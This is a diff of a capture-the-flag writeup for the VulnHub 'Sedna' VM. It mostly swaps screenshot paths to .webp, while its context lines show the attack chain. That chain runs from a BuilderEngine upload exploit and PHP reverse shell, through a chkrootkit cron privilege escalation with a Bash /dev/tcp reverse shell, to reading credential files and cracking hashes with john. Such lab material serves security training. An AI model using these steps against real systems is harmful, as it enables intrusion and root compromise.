@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [hackfest2016: Sedna](https://www.vulnhub.com/entry/hackfest2016-sedna,181/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_sedna/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_sedna/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -295,7 +295,7 @@ http://192.168.92.176/license.txt
 searchsploit builderengine
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_sedna/screenshot02a.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_sedna/screenshot02a.png.webp)  
 
 2\. The exploit needs an update to point to the right `BuilderEngine` url and then it can be used to `POST` a local file to the target server. We use this exploit to upload a PHP reverse shell, note the location of uploaded file, start a local `netcat` listener and trigger file execution to catch incoming reverse shell:  
 ```
@@ -304,11 +304,11 @@ nc -nlvp 9999
 http://192.168.92.176/files/php-reverse-shell.php
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_sedna/screenshot01.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_sedna/screenshot01.png.webp)  
 
-![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_sedna/screenshot03.png)  
+![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_sedna/screenshot03.png.webp)  
 
-![writeup.exploitation.steps.2.3](/static/files/posts_vulnhub_sedna/screenshot04.png)  
+![writeup.exploitation.steps.2.3](/static/files/posts_vulnhub_sedna/screenshot04.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -339,7 +339,7 @@ crackmeforpoints
 cat /var/www/flag.txt
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_sedna/screenshot05.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_sedna/screenshot05.png.webp)  
 
 2\. We look for presence of `chkrootkit` shell script and find at `/etc/chkrootkit/chkrootkit`:  
 ```
@@ -347,7 +347,7 @@ find / -type f -name chkrootkit 2>/dev/null
 file /etc/chkrootkit/chkrootkit
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_sedna/screenshot05a.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_sedna/screenshot05a.png.webp)  
 
 3\. We find a local privilege escalation exploit for `chkrootkit` using `searchsploit` and look at steps to use this:  
 ```
@@ -355,9 +355,9 @@ searchsploit chkrootkit
 searchsploit -x 33899
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_sedna/screenshot05b.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_sedna/screenshot05b.png.webp)  
 
-![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_sedna/screenshot05c.png)  
+![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_sedna/screenshot05c.png.webp)  
 
 4\. For the exploit to work, we create a `/tmp/update` file, assign executable permissions to it and add a Bash reverse shell command to it:  
 ```
@@ -368,28 +368,28 @@ cat /tmp/update
   bash -i >& /dev/tcp/192.168.92.163/443 0>&1
 ```
 
-![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_sedna/screenshot05d.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_sedna/screenshot05d.png.webp)  
 
 5\. Once `chkrootkit` shell script excutes via `cronjob`, it will also run `/tmp/update` file with `root` privileges giving us an elevated shell:  
 ```
 nc -nlvp 443
 ```
 
-![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_sedna/screenshot06.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_sedna/screenshot06.png.webp)  
 
 6\. We then get the second flag at `/root/flag.txt`:  
 ```
 cat /root/flag.txt
 ```
 
-![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_sedna/screenshot07.png)  
+![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_sedna/screenshot07.png.webp)  
 
 7\. While exploring `/etc/tomcat7` directory we come across third flag:  
 ```
 cat /etc/tomcat7/tomcat-users.xml
 ```
 
-![writeup.privesc.steps.7.1](/static/files/posts_vulnhub_sedna/screenshot08.png)  
+![writeup.privesc.steps.7.1](/static/files/posts_vulnhub_sedna/screenshot08.png.webp)  
 
 8\. To obtain fourth and final flag, we need to crack hash for user `crackmeforpoints`. We created a wordlist from `https://en.wikipedia.org/wiki/90377_Sedna` and tried bruteforcing but it failed. We then tried bruteforcing using the `rockyou.txt` wordlist but it didn't complete on time:  
 ```
@@ -398,9 +398,9 @@ unshadow passwd shadow >unshadowed ; john --rules --wordlist=./dict.txt unshadow
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
 ```
 
-![writeup.privesc.steps.8.1](/static/files/posts_vulnhub_sedna/screenshot09.png)  
+![writeup.privesc.steps.8.1](/static/files/posts_vulnhub_sedna/screenshot09.png.webp)  
 
-![writeup.privesc.steps.8.2](/static/files/posts_vulnhub_sedna/screenshot10.png)  
+![writeup.privesc.steps.8.2](/static/files/posts_vulnhub_sedna/screenshot10.png.webp)  
 
 ## Loot
 ### Hashes
